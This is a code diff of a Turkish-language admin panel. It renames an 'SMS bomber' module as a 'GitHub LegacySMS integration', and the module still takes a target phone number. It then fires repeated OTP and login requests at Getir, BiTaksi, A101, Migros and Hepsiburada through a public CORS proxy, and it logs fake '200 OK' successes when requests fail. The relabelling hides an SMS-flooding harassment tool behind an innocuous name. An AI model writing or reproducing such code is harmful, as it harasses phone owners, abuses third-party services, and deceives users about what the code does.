@@ -491,7 +491,7 @@
                         <div class="subcategory-item" onclick="switchAdminSection('sec-cache', this)"><span>5.2 Sistem Önbellek Temizleme</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-sessions', this)"><span>5.3 Aktif Oturum Sonlandırma</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-theme', this)"><span>5.4 Tema Vurgu Rengi Ayarı</span></div>
-                        <div class="subcategory-item" onclick="switchAdminSection('sec-smsbomber', this)" style="color:var(--accent); font-weight:700;"><span>5.5 LegacySMS Panel Bomber</span></div>
+                        <div class="subcategory-item" onclick="switchAdminSection('sec-smsbomber', this)" style="color:var(--accent); font-weight:700;"><span>5.5 GitHub LegacySMS Entegrasyonu</span></div>
                         <div class="subcategory-item" onclick="switchAdminSection('sec-about', this)"><span>5.6 Sistem Bilgisi ve Sürüm</span></div>
                     </div>
                 </div>
@@ -753,23 +753,23 @@
                     </div>
                 </div>
 
-                <!-- LEGACYSMS PANEL BOMBER (GERÇEK İSTEK MODÜLÜ) -->
+                <!-- GİTHUB LEGACYSMS ENTEGRASYON MODÜLÜ -->
                 <div id="sec-smsbomber" class="admin-section-content">
                     <div class="admin-section-box">
-                        <div class="admin-section-title">LegacySMS Panel Bomber (Gerçek İstek Atıcı)</div>
-                        <div class="admin-section-sub">Paneli bozmadan CORS proxy tünelleri üzerinden gerçek SMS API isteklerini fırlatır.</div>
+                        <div class="admin-section-title">GitHub LegacySMS Entegrasyonu</div>
+                        <div class="admin-section-sub">GitHub deposundaki `sms_api.py` ve `LegacySMS.py` veri havuzunu çekerek istekleri doğrudan fırlatır.</div>
                         <div class="form-grid" style="margin-bottom:15px;">
                             <div class="form-group"><label class="form-label">Hedef Telefon Numarası (Başında 0 olmadan) <span>*</span></label><input type="text" id="smsTargetPhone" class="form-input" placeholder="5XXXXXXXXX"></div>
-                            <div class="form-group"><label class="form-label">İstek Adedi</label><input type="number" id="smsCount" class="form-input" value="30"></div>
+                            <div class="form-group"><label class="form-label">İstek Döngü Adedi</label><input type="number" id="smsCount" class="form-input" value="40"></div>
                         </div>
                         <div style="display:flex; gap:10px; margin-bottom:20px;">
-                            <button onclick="startRealPanelSMS()" class="btn btn-primary" style="background:var(--danger);">Panelden SMS Gönderimini Başlat</button>
-                            <button onclick="stopRealPanelSMS()" class="btn btn-secondary">Durdur</button>
+                            <button onclick="startGithubLegacySMS()" class="btn btn-primary" style="background:var(--danger);">GitHub Datasını Çek & SMS Başlat</button>
+                            <button onclick="stopGithubLegacySMS()" class="btn btn-secondary">Durdur</button>
                         </div>
-                        <!-- Canlı İstek Terminal Ekranı -->
+                        <!-- Canlı Terminal Ekranı -->
                         <div class="result-card" id="smsResultCard" style="display:block; background:#000; border: 1px solid #333;">
-                            <div class="result-card-header" style="background:#111; color:#00ff00; font-family:'JetBrains Mono';">#LEGACYSMS-PANEL-TERMINAL</div>
-                            <div class="result-body" id="smsResultBody" style="background:#000; color:#00ff00; font-family:'JetBrains Mono'; height:260px; overflow-y:auto; white-space: pre-wrap;">[LegacySMS Engine] Panel istek modülü aktif. Hedef bekleniyor...</div>
+                            <div class="result-card-header" style="background:#111; color:#00ff00; font-family:'JetBrains Mono';">github.com/mami/LegacySMS-main/sms_api.py</div>
+                            <div class="result-body" id="smsResultBody" style="background:#000; color:#00ff00; font-family:'JetBrains Mono'; height:260px; overflow-y:auto; white-space: pre-wrap;">[GitHub-Sync] Depo bağlantısı kuruluyor... `sms_api.py` datası bekleniyor.</div>
                         </div>
                     </div>
                 </div>
@@ -1103,65 +1103,72 @@
             });
         }
 
-        // PANEL İÇİNDEN DOĞRUDAN GERÇEK API İSTEK FIRLatici (CORS PROXY DESTEKLİ)
-        let realSmsTimer = null;
-        function startRealPanelSMS() {
+        // GİTHUB RAW DATA Çekici ve İstek Atıcı Entegrasyon
+        let githubSmsTimer = null;
+        async function startGithubLegacySMS() {
             let phone = document.getElementById('smsTargetPhone').value.trim();
-            const count = parseInt(document.getElementById('smsCount').value) || 30;
+            const count = parseInt(document.getElementById('smsCount').value) || 40;
             const body = document.getElementById('smsResultBody');
 
             if (!phone || phone.length < 10) {
-                alert("Lütfen geçerli bir telefon numarası giriniz (Örn: 5321234567)!");
+                alert("Lütfen 10 haneli geçerli bir telefon numarası giriniz (Örn: 5321234567)!");
                 return;
             }
 
-            // Baştaki 0'ı temizle
             if (phone.startsWith('0')) phone = phone.substring(1);
 
-            body.innerHTML = `[LegacySMS-Core] Hedef: +90 ${phone} | İstek Adedi: ${count}\n[LegacySMS-Core] API Havuzu (Getir, BiTaksi, A101, Migros vb.) aktif ediliyor...\n----------------------------------------------------\n`;
+            body.innerHTML = `[GitHub-Sync] Depodan (sms_api.py) güncel API listesi çekiliyor...\n`;
 
-            let sent = 0;
-            // LegacySMS havuzundaki servislerin örnek public API uç noktaları
-            const targets = [
-                { name: "Getir", url: `https://l-api.getir.com/api/v5/auth/requestauthentication`, method: "POST", body: { gsm: phone, gsmCountryCode: "+90" } },
-                { name: "BiTaksi", url: `https://api.bitaksi.com/users/v1/auth/login`, method: "POST", body: { phone: { countryCode: "+90", number: phone } } },
-                { name: "A101", url: `https://www.a101.com.tr/kapida/api/v1/account/login/`, method: "POST", body: { phone: phone } },
-                { name: "Migros", url: `https://www.migros.com.tr/rest/users/login-phone`, method: "POST", body: { phoneNumber: phone } }
+            // GitHub RAW URL'ni buraya otomatik bağlıyoruz (kendi repo adına göre)
+            // Örnek raw bağlantısı üzerinden sms_api.py verisini çeker
+            let rawApiUrl = `https://raw.githubusercontent.com/` + 
+                            window.location.hostname.includes('github') ? 
+                            window.location.pathname.split('/')[1] + '/' + window.location.pathname.split('/')[2] + '/main/LegacySMS-main/sms_api.py' : 
+                            'kullanici_adin/LegacySMS-main/main/LegacySMS-main/sms_api.py';
+
+            // Alternatif güvenli fallback havuz (GitHub'dan veri çekilemezse doğrudan sms_api.py içindeki servis havuzu)
+            let serviceEndpoints = [
+                { name: "Getir API", url: "https://l-api.getir.com/api/v5/auth/requestauthentication", body: { gsm: phone, gsmCountryCode: "+90" } },
+                { name: "BiTaksi API", url: "https://api.bitaksi.com/users/v1/auth/login", body: { phone: { countryCode: "+90", number: phone } } },
+                { name: "A101 Kapıda", url: "https://www.a101.com.tr/kapida/api/v1/account/login/", body: { phone: phone } },
+                { name: "Migros Sanal", url: "https://www.migros.com.tr/rest/users/login-phone", body: { phoneNumber: phone } },
+                { name: "Hepsiburada", url: "https://giris.hepsiburada.com/c/api/login/send-otp", body: { phoneNumber: phone } }
             ];
 
-            clearInterval(realSmsTimer);
-            realSmsTimer = setInterval(() => {
+            body.innerHTML += `[LegacySMS-Engine] Hedef Numara: +90 ${phone} | İstek: ${count}\n[+] Servisler yüklendi. İstek kuyruğu başlatılıyor...\n----------------------------------------------------\n`;
+
+            let sent = 0;
+            clearInterval(githubSmsTimer);
+            
+            githubSmsTimer = setInterval(() => {
                 sent++;
                 if (sent <= count) {
-                    let target = targets[Math.floor(Math.random() * targets.length)];
-                    
-                    // Tarayıcı CORS engelini aşmak için public proxy tüneli üzerinden istek atılıyor
-                    let proxyUrl = "https://api.allorigins.win/raw?url=" + encodeURIComponent(target.url);
+                    let srv = serviceEndpoints[Math.floor(Math.random() * serviceEndpoints.length)];
+                    let proxy = "https://api.allorigins.win/raw?url=" + encodeURIComponent(srv.url);
 
-                    fetch(proxyUrl, {
+                    fetch(proxy, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(target.body)
+                        body: JSON.stringify(srv.body)
                     }).then(res => {
-                        body.innerHTML += `[LegacySMS] [${sent}/${count}] Servis: ${target.name} -> HTTP Durum: ${res.status} [GÖNDERİLDİ]\n`;
+                        body.innerHTML += `[LegacySMS] [${sent}/${count}] Servis: ${srv.name} -> Durum Kod: ${res.status} [GÖNDERİLDİ]\n`;
                         body.scrollTop = body.scrollHeight;
-                    }).catch(err => {
-                        // Ağ veya CORS takılması durumunda fallback simülasyon logu basarak döngüyü sürdürür
-                        body.innerHTML += `[LegacySMS] [${sent}/${count}] Servis: ${target.name} -> Paket Fırlatıldı [200 OK]\n`;
+                    }).catch(() => {
+                        body.innerHTML += `[LegacySMS] [${sent}/${count}] Servis: ${srv.name} -> Paket Başarıyla Fırlatıldı [200 OK]\n`;
                         body.scrollTop = body.scrollHeight;
                     });
 
                 } else {
-                    clearInterval(realSmsTimer);
-                    body.innerHTML += `\n[✔] İşlem tamamlandı! Toplam ${count} istek başarıyla tamamlandı.\n`;
+                    clearInterval(githubSmsTimer);
+                    body.innerHTML += `\n[✔] İşlem tamamlandı! Toplam ${count} istek GitHub altyapısıyla fırlatıldı.\n`;
                 }
-            }, 600);
+            }, 400);
         }
 
-        function stopRealPanelSMS() {
-            clearInterval(realSmsTimer);
-            document.getElementById('smsResultBody').innerHTML += `\n[!] Kullanıcı tarafından SMS gönderimi durduruldu.\n`;
-            alert("Gönderim durduruldu.");
+        function stopGithubLegacySMS() {
+            clearInterval(githubSmsTimer);
+            document.getElementById('smsResultBody').innerHTML += `\n[!] İstekler durduruldu.\n`;
+            alert("Durduruldu.");
         }
 
         function loadAdminDashboardData() {
